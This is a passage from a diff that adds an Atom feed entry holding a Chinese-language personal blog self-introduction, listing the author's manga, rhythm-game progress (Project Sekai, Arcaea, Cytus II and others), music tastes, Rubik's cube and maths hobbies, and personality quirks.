+</li>
+<li>
+<p><strong>堀与宫村</strong>（至40话）也不太有印象</p>
+</li>
+<li>
+<p><strong>辉夜大小姐</strong>（至200话）<s>还好我当时弃坑了，没看到赤坂开始整活</s></p>
+</li>
+<li>
+<p><strong>五等分的花嫁</strong>（全本）不过是跳着看的，没什么印象了（只记得番剧四叶是樱小姐配的</p>
+</li>
+</ul>
+<p><strong>轻小说</strong></p>
+<p>曾在补完魔女之旅的番剧后看完了<em>魔女之旅</em>小说前三卷。</p>
+<p>如果番剧没有第二季，那也许以后会把它补完。</p>
+<h2 id="game-音游">Game 音游</h2>
+<ul>
+<li><strong>Project Sekai</strong> <s>（频率极低）</s> 现在基本只打烤</li>
+</ul>
+<p>2024.1.7更新：打烤认识了不少朋友，还是挺不错的</p>
+<p>2023.7.30更新：紫谱32有三首FC，31余三首FC，真皆三，红谱FC有两百多首吧</p>
+<p>最高成就可能是脑浆炸裂少女ma32的1miss（虽然几十个great</p>
+<p>21年春季被朋友安利Project Sekai，然后真香了。</p>
+<p>25时箱推，人物主推Enana，歌曲主推合唱版的向着无尽之灰。</p>
+<p>(当时每天临睡前都要摸一遍因为实在是太好听了 但是还是clear不了ma 是我太菜.jpg)</p>
+<p>大概能Clear掉一些29及30(wowaka有一首31也是硬糊Clear<s>不 要 越 级 打 歌 不 好</s>，大部分26、27可以较轻松地Clear，部分可Full Combo，但会有10-40不等的Great。也许多刷几遍可以压下去。</p>
+<ul>
+<li><strong>SDVX</strong></li>
+</ul>
+<p>买了一个小彩虹台玩玩，目前大概是<strong>麗華</strong>认定的水平，因为弱4k所以进步不快，但是觉得这音游蛮好玩且蛮有挑战性的。</p>
+<ul>
+<li><strong>Cytoid</strong> <s>（频率较高）</s> 已退坑</li>
+</ul>
+<p>2022.7入坑，但是目前为止只能u判打几首MAX，tp只有98左右。手机端是真不会抓准度，平板位移力不足QAQ缓慢进步中</p>
+<ul>
+<li><strong>Cytus II</strong> <s>（频率中等）</s> 基本退坑</li>
+</ul>
+<p>2023.2 Incyde MM！！因为去刷Arcaea了所以基本退坑了</p>
+<p>2022.8 没想到真的一直玩下来玩了八个月左右，现在全曲混沌难度有1/5左右mm的亚子，最高是15.0的<em>FUJIN Rumble</em>，不过感觉瓶颈期所以暂时佛系打歌，入一下Cytoid</p>
+<p>22年从1.1到2.8玩了一段时间的Cytus II。从零基础到mm了两首Chaos14、一首Glitch13，而且现在感觉长交互比打Arc那会打糊得稳定一点了x</p>
+<p><strong>Arcaea</strong>（已退坑）</p>
+<p>2023.7.30更新：今年四月左右冲到了双星，之后再次退坑。<s>然后掉到了12.49</s></p>
+<p>2022.2.8更新： 我已经不知道怎么玩蛇了x 目前ptt11.3左右</p>
+<p>是Arcaea的萌新玩家，目前ptt为10.92，但近期因为转战Cytus II所以很久没摸过Arc了。</p>
+<p><strong>Malody</strong>（已退坑）</p>
+<p>2022.7.28更新：过了4dan，不过叠力完全不够，所以只是很偶然且碰运气地过了一个</p>
+<p>是Malody的萌新及佛系玩家，主要玩4k和Slide，但投入时间很少，平时只是随缘打一打商店里十几级的谱，大概是e判90+%，刷的次数多一点的大多是95+%。</p>
+<p><strong>BanG Dream!</strong>（已退坑）</p>
+<p>是BanG Dream!的萌新玩家，游戏时间大概是100+h。入坑时（约2020.11）水平为Clear一些简单的23-25（由于四谎有一点点厨力 硬凑了kimidayo的三个粉星和一个ex黄星，而ex粉星大概在入坑两个月后），三个月后（其中有大概半个月的退坑时间）全奶勉强苟过去六兆年ex、sp和燐燐开花ex，并通过邦邦获得了萌新音游狗属性。</p>
+<p>因为刚入坑的时候是Afterglow及happy属性活动，所以抽到一个四星美竹兰和一个四星鸫（均为Happy），至淡坑（入Project Sekai及Arcaea）时勉强凑了一队Afterglow+Happy的三四星。(甚至因此而第一次记住了一个CV名：佐仓绫音</p>
+<p>以及确实是被邦邦的音乐储量吸引（如<em>光るなら</em>的翻唱）才踏入移动端音游大坑的，甚至在邦邦的影响下看了许多番，所以邦邦对我来说意义重大。</p>
+<h2 id="音乐">音乐🎵</h2>
+<p>本命曲是 <em><strong>门德尔松e小调小提琴协奏曲</strong></em> 。尤其喜欢第一乐章。</p>
+<p>之前听得最多的是<strong>欧美流行歌曲</strong>，近一两年主要在听<strong>VOCALOID</strong>、<strong>J-Pop</strong>、<strong>J-Rock</strong>。</p>
+<p>各类摇滚、以弦乐为主的古典音乐、东方相关同人创作曲都有很浅的涉及。</p>
+<p>另外最近一段时间正在尝试乐团，尝试把自己的一些想法塞进去。</p>
+<ul>
+<li>
+<p><strong>欧美歌曲</strong> 主属性为霉粉（见后续介绍），本命歌曲为<em>Mirrors - Justin Timberlake</em>。除了霉歌之外相对较喜欢Ed Sheeran、Eminem、Justin Timberlake等歌手的歌曲。</p>
+</li>
+<li>
+<p><strong>摇滚</strong> 比较喜欢Eric Clapton的吉他solo，比如<em>Layla - Derek &amp; The Dominos</em>。另外听过一点点Led Zeppelin和Pink Floyd。</p>
+</li>
+<li>
+<p><strong>Vocaloid&amp;J-Pop&amp;J-Rock</strong> 印象比较深刻的有Orangestar、Last Note.、TUYU、Yorushika等。</p>
+</li>
+</ul>
+<p>较喜欢的歌曲列表参见<a href="https://music.163.com/#/playlist?id=569546376">网易云音乐：Meredith2328的红心列表</a>，因为是在一万五千首播放里留下来一百四十首左右，所以应该大致能反映我的音乐爱好。</p>
+<p><s>（2022.8更新：高考英语翻大车，作文满分but总分136，含泪提醒家人们不要立flag↓↓↓）</s></p>
+<p><s>并不清楚听欧美歌曲和自己英语学习有什么联系，但英语确实相对来说较擅长。</s></p>
+<h2 id="其他属性">其他属性</h2>
+<ul>
+<li><strong>魔方</strong>（已退坑）</li>
+</ul>
+<p>大致是初中时期学习了魔方的基本玩法及CFOP（OLL背了一半），但练习非常佛系，目前大概是avg22。<s>2024.1.7补：现在怕是avg30也没有吧</s></p>
+<p><s>但现在PLL都记不全了</s></p>
+<ul>
+<li><strong>霉粉</strong></li>
+</ul>
+<p>三次元属性为霉粉，入坑时间介于<em>1989</em>和<em>reputation</em>之间。对霉的大多数歌曲都较喜欢，但并没有特别喜欢的歌曲。</p>
+<p>（2022.8更新：现在巨爱<em>Folklore</em>和<em>Evermore</em>这种 安静祥和(? 的曲风，似乎与之前相比有点属性颠倒的感觉）</p>
+<p>几张专辑中相对来说最喜欢<em>1989</em>，其次为<em>Lover</em>和<em>reputation</em>。尽管从<em>1989</em>到<em>Evermore</em>都买了数字专辑，但是很少听<em>Folklore</em>和<em>Evermore</em>。由此认为个人喜好更偏向Pop而非Country。</p>
+<ul>
+<li><strong>数学</strong></li>
+</ul>
+<p><s>（2022.8更新：高考数学也翻车了，连带着物理一起翻，意难平.jpg）</s></p>
+<p>喜欢看各类科普视频，尤其喜欢数学科普视频。对数学比较喜爱且相对来说学习起来比较轻松，但平时由于废宅属性对数学投入的时间很少。<s>这一点在此时此刻才被注意到，的确应当反思</s></p>
+<h2 id="补充设定">补充设定！！！</h2>
+<ul>
+<li>
+<p>是个⑨，有<strong>天然</strong>属性。</p>
+</li>
+<li>
+<p>经常在许多小事上<strong>较真</strong>，消耗大量时间。</p>
+</li>
+</ul>
+<p><s>(比如花掉四个小时处理pjsk的莫名白屏进不去游戏的问题</s></p>
+<p><s>((最后还没解决</s></p>
+<p>再比如说在看到自己某一道题忘记画对号时一定会补上，就算是好久以前做的。(轻度强迫症/完美主义？</p>
+<ul>
+<li>平时有<strong>玩梗</strong>习惯，在聊天时会自觉or不自觉地造梗。</li>
+</ul>
+<p><s>但是实际上是社交废，在户外会不自觉拘束的亚子（被评价说和线上判若两人</s></p>
+<ul>
+<li>经常凭借<strong>一时兴起</strong>做事情。不过似乎需要适当调整一下。</li>
+</ul>
+<p>（2024.1.31更新）</p>
+<ul>
+<li>
+<p>自己完全不想做的事情一件事也不会做，不然会违反设定的。(?)</p>
+</li>
+<li>
+<p>目前在学的专业的简化版目标大概是<strong>手搓一个高达</strong>出来，并写好使用手册。(???)</p>
+</li>
+</ul>
+<p><s>但是其实压根没看过高达，警钟长鸣</s></p>
+<ul>
+<li>想做的事情有时候会很上头地一口气做完，比如看番感觉对味就一口气补完 <s>之后忍不住了直接无缝衔接原作漫画</s></li>
+</ul>
+<p><s>有时候新番更了一点点但是很上头就一口气把原作全看完然后就不想看新番连载了，辉夜和芙莉莲等等一堆番都因为这个事情影响到了追番体验，你从上一句完全不顾标点直接一口气说完就能看出来这一条设定的坚不可摧</s></p>
+]]></content>
+    </entry>
+</feed>
